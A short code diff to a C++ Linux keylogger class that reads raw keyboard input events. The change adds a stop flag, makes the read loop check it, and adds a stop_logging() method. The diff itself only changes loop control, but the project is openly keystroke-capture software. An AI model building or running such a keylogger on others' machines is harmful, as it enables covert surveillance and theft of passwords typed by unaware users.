@@ -49,6 +49,7 @@ std::string exec(const char* cmd) {
  */
 Keylogger::Keylogger(std::string log_filename) {
     m_log_filename = log_filename;
+    m_done = false;
     m_keyboard_path = get_keyboard_path();
     printf("Using %s as input device\n", m_keyboard_path.c_str());
     // TODO: Use exceptions instead of if statements
@@ -67,12 +68,17 @@ Keylogger::Keylogger(std::string log_filename) {
  */
 // TODO: Change return type to void if needed
 bool Keylogger::start_logging() {
-    while (true) {
+    while (!m_done) {
         read(m_keyboard_fd, &m_ev, sizeof(struct input_event));
         if (m_ev.type == EV_KEY && m_ev.value == 1) {
             process_keys();
         }
     }
+}
+
+bool Keylogger::stop_logging() {
+    m_done = true;
+    return m_done;
 }
 
 /**
